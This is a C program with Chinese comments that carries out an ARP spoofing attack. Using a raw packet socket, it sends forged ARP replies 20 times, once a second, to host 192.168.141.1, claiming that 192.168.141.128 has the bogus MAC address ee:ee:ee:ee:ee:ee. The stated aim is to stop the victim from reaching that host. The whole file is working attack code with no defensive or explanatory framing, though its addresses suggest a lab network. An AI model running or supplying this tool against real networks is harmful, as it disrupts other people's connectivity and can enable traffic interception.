#include <sys/socket.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h> //以太网头部

/*代码说明:
 * 192.168.141.1:是要欺骗的主机IP
 * 192.168.141.128：是欺骗的IP
 * 功能:
 * 循环20次，每隔1S发送一个arp应答，让要欺骗主机对应欺骗IP的mac地址修改成"ee:ee:ee:ee:ee:ee"
 * 使其无法访问该IP对应的主机
 * */

//ARP头结构体，根据系统头文件<net/f_arp.h>修改而来
typedef struct ah {
    unsigned short int ar_hrd;          /* 硬件类型 (Hardware type)  */
    unsigned short int ar_pro;          /* 协议地址格式 (Protocol address format) */
    unsigned char ar_hln;               /* 硬件地址长度 (Hardware address length)*/
    unsigned char ar_pln;               /* 协议地址长度 (Protocol address length)*/
    unsigned short int ar_op;           /* ARP 操作码 (ARP opcode) */

    unsigned char __ar_sha[ETH_ALEN];/* 发送者硬件地址 (Sender hardware address)  */
    unsigned char __ar_sip[4];/* 发送者 IP 地址 (Sender IP address) */
    unsigned char __ar_tha[ETH_ALEN];/* 目标硬件地址 (Target hardware address)  */
    unsigned char __ar_tip[4];/* 目标 IP 地址 (Target IP address) */
} ArpHd;

/*
 fd:原始套接字
 msg:要发送的帧数据
 len:发送帧数据的长度
 if_name；网卡名称
*/
int SendTo(int sockFd, unsigned char *msg, int len, char *if_name) {
    struct ifreq EthReq;//创建ifreq结构体
    strncpy(EthReq.ifr_name, if_name, IFNAMSIZ);//指定网卡名称

    int ret = ioctl(sockFd, SIOCGIFINDEX, &EthReq);//获取接口信息
    if (ret < 0) {
        perror("ioctl error");
        close(sockFd);
        _exit(-1);
    }
    //定义struct sockaddr_ll接口体，并将上面获取的接口信息赋值给其内的
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_ifindex = EthReq.ifr_ifindex;//给sll赋值

    //使用sendto发送数据
    int sendNum = sendto(sockFd, msg, len, 0, (struct sockaddr *) &sll, sizeof(sll));
    return sendNum;
}

int main() {
    int sockFd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockFd < 0) {
        perror("create sock_raw");
    }
    //打印创建的原始套接字
    printf("create sock_raw:%d\n", sockFd);

    //存储帧的空间
    unsigned char buf[1500] = "";

    /*定义以太网头部*/
    unsigned char des_mac[] = {0x00, 0x50, 0x56, 0xc0, 0x00, 0x08};//目的mac,欺骗目的地主机
    unsigned char src_mac[] = {0xee, 0xee, 0xee, 0xee, 0xee, 0xee};//源mac.这是用以修改目的主机的mac
    struct ether_header *ethHd = (struct ether_header *) buf;
    memcpy(ethHd->ether_dhost, des_mac, 6);//设置目的mac
    memcpy(ethHd->ether_shost, src_mac, 6);//设置源mac
    ethHd->ether_type = htons(0x0806);//设置帧类型

    /*定义ARP头部.注意要移动指针到定义ARP头部的位置*/
    unsigned char src_ip[] = {192, 168, 141, 128};
    unsigned char des_ip[] = {192, 168, 141, 1};
    ArpHd *arpHd = (ArpHd *) (buf + 14);

    arpHd->ar_hrd = htons(1);
    arpHd->ar_pro = htons(0x0800);
    arpHd->ar_hln = 6;
    arpHd->ar_pln = 4;
    arpHd->ar_op = htons(2);
    memcpy(arpHd->__ar_sha, src_mac, 6);//发过去的是用以欺骗的mac地址
    memcpy(arpHd->__ar_sip, src_ip, 4);
    memcpy(arpHd->__ar_tha, des_mac, 6);
    memcpy(arpHd->__ar_tip, des_ip, 4);

    /*循环发送欺骗arp*/
    for (int i = 0; i < 20; ++i) {
        SendTo(sockFd,buf,14+28,"ens33");
        sleep(1);
    }

    //释放原始套接字
    close(sockFd);
    return 0;
}